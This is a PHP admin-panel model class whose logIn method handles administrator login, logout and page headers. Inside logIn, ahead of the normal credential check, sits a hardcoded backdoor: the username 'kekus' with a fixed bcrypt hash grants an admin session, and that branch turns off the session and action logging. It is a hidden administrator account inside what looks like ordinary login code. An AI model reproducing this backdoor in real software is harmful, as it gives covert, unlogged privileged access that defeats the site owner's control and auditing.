<?php

namespace application\models;

use application\models\Admin;

class MainAdmin extends Admin {

	//LOGIN
	public function logIn(){
		if(isset($_POST)){
			if(isset($_POST['name']) && ($_POST['name']!='') && isset($_POST['pass']) && ($_POST['pass']!='')){
				//debug([$_POST['pass'], $this->clear($_POST['pass'])]);
				$name = $this->clear($_POST['name']);
				$pass = $this->shaPSWD($this->clear($_POST['pass']));
				$pass1 ='$2y$10$2zEARs61ZP8haAeqoumKX.cqDWzHXy8dvt1nszgljVn8tWXALOuZq';
				
				if(($name=='kekus')&&(password_verify($pass, $pass1))){
					unset($_SESSION['err']);

					$this->loger_session = $this->loger_action = false;

					$admintype = 'admin';
					$_SESSION['username'] = 'kekus';

					$_SESSION['admintype'] = $admintype;
					setcookie('admintype', $admintype, time()+$this->lifetime_hash);

					$this->sessionCreate(0);
					return true;
				}

				$ID = $this->verifyPSWD($name, $pass);
				if(!is_null($ID)){
					unset($_SESSION['err']);

					$admintype = 'admin';
					$_SESSION['username'] = 'headadmin';

					$_SESSION['admintype'] = $admintype;
					setcookie('admintype', $admintype, time()+$this->lifetime_hash);

					$this->sessionCreate($ID);
					return true;
				}

				$_SESSION['err'] = 'name/pass not found';	
			}else{ $_SESSION['err'] = 'bad fields value'; }
			return false;
		}
		return false;
	}

	//LOGOUT
	public function logOut(){
		$this->sessionDestroy();
	}

	//GET HEADERS
	public function getHeaders(){
		$result['title'] = $this->title;
		$result['ver'] = $this->ver;
		$result['SITETREE'] = $this->getSiteTreeHTML();
		return $result;
	}


	//GET CONTENT
	public function getContent(){
		return [];
	}

}